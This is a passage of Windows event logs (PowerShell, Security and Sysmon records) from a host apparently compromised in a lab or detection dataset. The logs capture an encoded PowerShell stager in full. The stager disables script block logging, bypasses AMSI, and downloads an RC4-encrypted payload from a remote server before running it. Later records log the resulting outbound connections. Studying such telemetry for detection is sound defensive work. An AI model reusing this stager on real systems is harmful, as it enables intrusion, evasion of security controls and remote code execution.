yAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71017\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71017\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\""},"computer_name":"HR001.shire.com","source_name":"Microsoft-Windows-PowerShell","record_number":"92769","log_name":"Microsoft-Windows-PowerShell/Operational","level":"Information","process_id":5452,"thread_id":3896,"user":{"identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha","domain":"SHIRE","type":"User"},"version":1,"beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"host":{"name":"WECserver"},"type":"wineventlog","task":"Executing Pipeline","opcode":"To be used when operation is just executing a method","event_id":4103,"activity_id":"{c93a7728-017f-0000-0101-4aca7f01d501}"}
{"@timestamp":"2019-05-18T20:43:04.159Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"log_name":"Security","keywords":["Audit Success"],"message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t5452\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.106\n\tSource Port:\t\t53371\n\tDestination Address:\t10.0.10.106\n\tDestination Port:\t\t443\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67557\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","type":"wineventlog","source_name":"Microsoft-Windows-Security-Auditing","event_data":{"SourcePort":"53371","DestAddress":"10.0.10.106","DestPort":"443","FilterRTID":"67557","LayerName":"%%14611","ProcessID":"5452","Protocol":"6","Direction":"%%14593","RemoteMachineID":"S-1-0-0","RemoteUserID":"S-1-0-0","SourceAddress":"172.18.39.106","LayerRTID":"48","Application":"\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"},"computer_name":"HR001.shire.com","level":"Information","record_number":"288249","event_id":5156,"opcode":"Info","process_id":4,"host":{"name":"WECserver"},"thread_id":1288,"version":1,"task":"Filtering Platform Connection","beat":{"hostname":"WECserver","version":"6.7.0","name":"WECserver"}}
{"@timestamp":"2019-05-18T20:43:04.179Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"source_name":"Microsoft-Windows-Sysmon","host":{"name":"WECserver"},"task":"Registry object added or deleted (rule: RegistryEvent)","opcode":"Info","log_name":"Microsoft-Windows-Sysmon/Operational","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","process_id":2440,"event_data":{"ProcessId":"5452","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","EventType":"CreateKey","UtcTime":"2019-05-18 20:43:04.144","ProcessGuid":"{03ba39f5-50b2-5ce0-0000-00109995c501}"},"computer_name":"HR001.shire.com","type":"wineventlog","version":2,"record_number":"2237792","thread_id":3144,"level":"Information","beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"event_id":12,"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-05-18 20:43:04.144\nProcessGuid: {03ba39f5-50b2-5ce0-0000-00109995c501}\nProcessId: 5452\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"}
{"@timestamp":"2019-05-18T20:43:04.238Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"process_id":2440,"level":"Information","opcode":"Info","message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:20.855\nProcessGuid: {03ba39f5-4cfe-5ce0-0000-00103600c001}\nProcessId: 5172\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53369\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"log_name":"Microsoft-Windows-Sysmon/Operational","event_data":{"SourceIp":"172.18.39.106","DestinationIsIpv6":"false","Initiated":"true","DestinationIp":"10.0.10.106","DestinationPort":"443","SourceIsIpv6":"false","UtcTime":"2019-05-07 11:56:20.855","DestinationPortName":"https","Protocol":"tcp","ProcessId":"5172","User":"SHIRE\\nmartha","ProcessGuid":"{03ba39f5-4cfe-5ce0-0000-00103600c001}","SourceHostname":"HR001.shire.com","SourcePort":"53369","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},"version":5,"record_number":"2237793","task":"Network connection detected (rule: NetworkConnect)","host":{"name":"WECserver"},"type":"wineventlog","source_name":"Microsoft-Windows-Sysmon","event_id":3,"computer_name":"HR001.shire.com","thread_id":2368,"beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}
{"@timestamp":"2019-05-18T20:43:05.019Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"log_name":"Microsoft-Windows-Sysmon/Operational","message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:21.769\nProcessGuid: {03ba39f5-652c-5ce0-0000-0010760bff01}\nProcessId: 7924\nImage: C:\\Windows\\System32\\notepad.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53370\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"version":5,"source_name":"Microsoft-Windows-Sysmon","opcode":"Info","task":"Network connection detected (rule: NetworkConnect)","process_id":2440,"event_id":3,"level":"Information","thread_id":2368,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"computer_name":"HR001.shire.com","record_number":"2237794","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","event_data":{"DestinationIsIpv6":"false","User":"SHIRE\\nmartha","SourceHostname":"HR001.shire.com","SourcePort":"53370","DestinationPort":"443","ProcessId":"7924","Protocol":"tcp","DestinationIp":"10.0.10.106","UtcTime":"2019-05-07 11:56:21.769","SourceIp":"172.18.39.106","DestinationPortName":"https","ProcessGuid":"{03ba39f5-652c-5ce0-0000-0010760bff01}","Initiated":"true","Image":"C:\\Windows\\System32\\notepad.exe","SourceIsIpv6":"false"},"type":"wineventlog"}
{"@timestamp":"2019-05-18T20:43:05.269Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"record_number":"2237795","event_data":{"DestinationPort":"443","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","DestinationIsIpv6":"false","DestinationPortName":"https","DestinationIp":"10.0.10.106","SourceIsIpv6":"false","SourceIp":"172.18.39.106","SourcePort":"53371","Protocol":"tcp","ProcessId":"5452","User":"SHIRE\\nmartha","Initiated":"true","ProcessGuid":"{03ba39f5-50b2-5ce0-0000-00109995c501}","SourceHostname":"HR001.shire.com","UtcTime":"2019-05-07 11:56:22.026"},"source_name":"Microsoft-Windows-Sysmon","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"computer_name":"HR001.shire.com","message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:22.026\nProcessGuid: {03ba39f5-50b2-5ce0-0000-00109995c501}\nProcessId: 5452\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53371\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","thread_id":2368,"version":5,"opcode":"Info","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"task":"Network connection detected (rule: NetworkConnect)","level":"Information","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","process_id":2440,"type":"wineventlog","log_name":"Microsoft-Windows-Sysmon/Operational","event_id":3}
{"@timestamp":"2019-05-18T20:43:08.097Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_data":{"param2":"\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=69902\n\n\tUserId=SHIRE\\nmartha\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17763.316\n\tHostId=9189b674-b66f-4ae4-af64-65d46d4e78e4\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7